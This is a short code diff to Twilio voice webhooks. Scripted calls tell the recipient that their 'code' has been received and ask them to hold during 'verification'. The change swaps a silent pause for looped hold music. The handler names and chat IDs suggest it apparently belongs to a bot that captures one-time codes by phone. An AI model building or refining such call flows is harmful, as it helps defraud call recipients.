@@ -254,7 +254,7 @@ def codigo_webhook(call_sid, chat_id):
     # Mantener cliente en espera
     response = VoiceResponse()
     response.say("Thank you. We have received your code. Please hold while we verify your information.", language="en-US", voice="alice", rate="85%")
-    response.pause(length=30)
+    response.play("http://com.twilio.music.classical.s3.amazonaws.com/ClockworkWaltz.mp3", loop=10)
     response.say("Thank you for your patience. Goodbye.", language="en-US", voice="alice", rate="85%")
     response.hangup()
     return Response(str(response), mimetype="text/xml")
@@ -351,7 +351,7 @@ def codigo2_webhook(call_sid, chat_id, tipo):
 
     response = VoiceResponse()
     response.say("Thank you. We have received your information. Please hold while we verify.", language="en-US", voice="alice", rate="85%")
-    response.pause(length=30)
+    response.play("http://com.twilio.music.classical.s3.amazonaws.com/ClockworkWaltz.mp3", loop=10)
     response.say("Thank you for your patience. Goodbye.", language="en-US", voice="alice", rate="85%")
     response.hangup()
     return Response(str(response), mimetype="text/xml")
